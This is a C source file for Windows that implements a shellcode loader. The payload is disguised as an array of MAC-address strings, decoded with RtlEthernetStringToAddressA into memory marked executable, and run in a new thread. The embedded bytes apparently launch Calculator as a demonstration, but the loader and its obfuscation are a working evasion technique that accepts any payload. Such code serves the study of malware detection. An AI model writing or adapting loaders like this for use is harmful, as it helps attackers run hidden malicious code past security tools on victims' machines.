#include <Windows.h>
#include <stdio.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

const char* MACShell[] = {
	"FC-48-83-E4-F0-E8", "C0-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72", "50-48-0F-B7-4A-4A", "4D-31-C9-48-31-C0", 
	"AC-3C-61-7C-02-2C", "20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B", "42-3C-48-01-D0-8B", "80-88-00-00-00-48", "85-C0-74-67-48-01", "D0-50-8B-48-18-44", 
	"8B-40-20-49-01-D0", "E3-56-48-FF-C9-41", "8B-34-88-48-01-D6", "4D-31-C9-48-31-C0", "AC-41-C1-C9-0D-41", "01-C1-38-E0-75-F1", "4C-03-4C-24-08-45", "39-D1-75-D8-58-44", 
	"8B-40-24-49-01-D0", "66-41-8B-0C-48-44", "8B-40-1C-49-01-D0", "41-8B-04-88-48-01", "D0-41-58-41-58-5E", "59-5A-41-58-41-59", "41-5A-48-83-EC-20", "41-52-FF-E0-58-41", 
	"59-5A-48-8B-12-E9", "57-FF-FF-FF-5D-48", "BA-01-00-00-00-00", "00-00-00-48-8D-8D", "01-01-00-00-41-BA", "31-8B-6F-87-FF-D5", "BB-E0-1D-2A-0A-41", "BA-A6-95-BD-9D-FF", 
	"D5-48-83-C4-28-3C", "06-7C-0A-80-FB-E0", "75-05-BB-47-13-72", "6F-6A-00-59-41-89", "DA-FF-D5-63-61-6C", "63-00-10-01-00-00",
};
#define ElementsNumber 46
#define SizeOfShellcode 276

BOOL DecodeMACFuscation(const char* MAC[], PVOID LpBaseAddress) {
	PCSTR Terminator = NULL;
	PVOID LpBaseAddress2 = NULL;
	NTSTATUS STATUS;
	int i = 0;
	for (int j = 0; j < ElementsNumber; j++) {
		LpBaseAddress2 = (ULONG_PTR)LpBaseAddress + i;
		STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[j], &Terminator, (DL_EUI48*)LpBaseAddress2);
		if (!NT_SUCCESS(STATUS)) {
			printf("[!] RtlEthernetStringToAddressA failed for %s result %x", MAC[j], STATUS);
			return FALSE;
		}
		else {
			i = i + 6;
		}
	}
	return TRUE;
}




int main() {
	PVOID MemAddress = VirtualAlloc(NULL, sizeof(MACShell), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	printf("[+] Allocated A Piece Of Memory At 0x%p \n", MemAddress);
	memcpy(MemAddress, MACShell, sizeof(MACShell));

	printf("[+] Copying Obfuscated MAC Shellcode From 0x%p Into 0x%p \n", &MACShell, MemAddress);

	DWORD OldProtection;
	VirtualProtect(MemAddress, sizeof(MACShell), PAGE_EXECUTE_READWRITE, &OldProtection);

	printf("[+] Changing Memory Protections At 0x%p\n", MemAddress);
	if (!DecodeMACFuscation(MACShell, MemAddress)) {
		return -1;
	}
	printf("[+] Creating Local Thread\n");
	HANDLE WaitForMe = CreateThread(NULL, 0, MemAddress, NULL, NULL, NULL);

	printf("[+] Hit Enter To Exit ... \n");
	WaitForSingleObject(WaitForMe, INFINITE);
	getchar();
	return 0;

}